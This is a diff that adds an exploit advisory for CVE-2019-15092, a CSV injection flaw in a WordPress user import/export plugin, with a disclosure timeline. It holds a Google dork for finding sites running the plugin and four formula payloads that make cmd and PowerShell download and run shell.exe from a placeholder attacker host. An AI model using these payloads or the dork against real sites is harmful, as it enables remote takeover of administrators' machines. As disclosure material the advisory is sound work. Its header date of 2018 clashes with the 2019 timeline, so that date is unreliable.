@@ -1,0 +1,48 @@
+# Exploit Title: Wordpress Plugin Import Export WordPress Users <= 1.3.1 - CSV Injection
+# Exploit Author: Javier Olmedo
+# Contact: @jjavierolmedo
+# Website: https://sidertia.com
+# Date: 2018-08-22
+# Google Dork: inurl:"/wp-content/plugins/users-customers-import-export-for-wp-woocommerce"
+# Vendor: WebToffee
+# Software Link: https://downloads.wordpress.org/plugin/users-customers-import-export-for-wp-woocommerce.1.3.1.zip
+# Affected Version: 1.3.1 and before
+# Active installations: +20,000
+# Patched Version: update to 1.3.2 version
+# Category: Web Application
+# Platform: PHP
+# Tested on: Win10x64
+# CVE: 2019-15092
+# References:
+# https://hackpuntes.com/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection/
+# https://medium.com/bugbountywriteup/cve-2019-15092-wordpress-plugin-import-export-users-1-3-0-csv-injection-b5cc14535787
+ 
+# 1. Technical Description
+# Wordpress Plugin Import Export WordPress Users version 1.3.1. and before are affected by Remote Code
+# Execution through the CSV injection vulnerability. This allows any application user to inject commands
+# as part of the fields of his profile and these commands are executed when a user with greater privilege 
+# exports the data in CSV and opens that file on his machine.
+
+# 2. Vulnerable code
+# The function do_export() from WF_CustomerImpExpCsv_Exporter class does not check if fields beggings
+# with (=, +, -, @) characters so the fields name, surname, alias or display_name are vulnerable to CSV Injection.
+ 
+# 3. Proof Of Concept (PoC)
+# 3.1 Login with subscriber user and change the fields First name, Surname and Alias with payloads.
+# 3.2 Login with a high privileges user and export all users to CSV.
+# 3.3 When the user with high privileges logs in to the application, export data in CSV and opens the 
+# generated file, the command is executed and the shell will run open on the machine.
+
+# 4. Payloads
+=cmd|'/C powershell IEX(wget http://ATTACKER/shell.exe)'!A0
++cmd|'/C powershell IEX(wget http://ATTACKER/shell.exe)'!A0
+-cmd|'/C powershell IEX(wget http://ATTACKER/shell.exe)'!A0
+@cmd|'/C powershell IEX(wget http://ATTACKER/shell.exe)'!A0
+
+# 5. Timeline
+# 15, august 2019 - [RESEARCHER] Discover
+# 15, august 2019 - [RESEARCHER] Report to Webtoffee support
+# 16, august 2019 - [DEVELOPER] More information request
+# 16, august 2019 - [RESEARCHER] Detailed vulnerability report
+# 19, august 2019 - [DEVELOPER] Unrecognized vulnerability
+# 22, august 2019 - [RESEARCHER] Public disclosure
